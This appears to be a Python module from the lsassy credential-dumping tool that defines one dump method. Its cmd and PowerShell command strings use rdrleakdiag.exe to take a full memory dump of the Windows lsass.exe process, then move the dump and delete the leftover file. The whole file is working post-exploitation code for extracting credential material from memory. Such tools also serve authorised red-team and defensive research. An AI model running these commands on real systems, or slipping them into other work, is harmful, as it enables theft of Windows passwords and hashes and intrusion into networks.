from lsassy.dumpmethod import IDumpMethod


class DumpMethod(IDumpMethod):

    def get_commands(self):
        cmd_command = """for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do rdrleakdiag.exe -p %J -enable & for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do rdrleakdiag.exe -p %J -o {} -fullmemdmp -snap & ping 127.0.0.1 -n 5 & for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do MOVE {}minidump_%J.dmp {}{} & for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do del {}results_%J.hlk""".format(
            self.dump_path, self.dump_path, self.dump_path, self.dump_name, self.dump_path
        )
        pwsh_command = """rdrleakdiag.exe -p (Get-Process lsass).Id -enable;rdrleakdiag.exe -p (Get-Process lsass).Id -o {} -fullmemdmp -snap;Start-Sleep 5;Move-Item {}minidump_$((Get-Process lsass).Id).dmp {}{};Remove-Item {}results_$((Get-Process lsass).Id).hlk""".format(
            self.dump_path, self.dump_path, self.dump_path, self.dump_name, self.dump_path
        )
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }
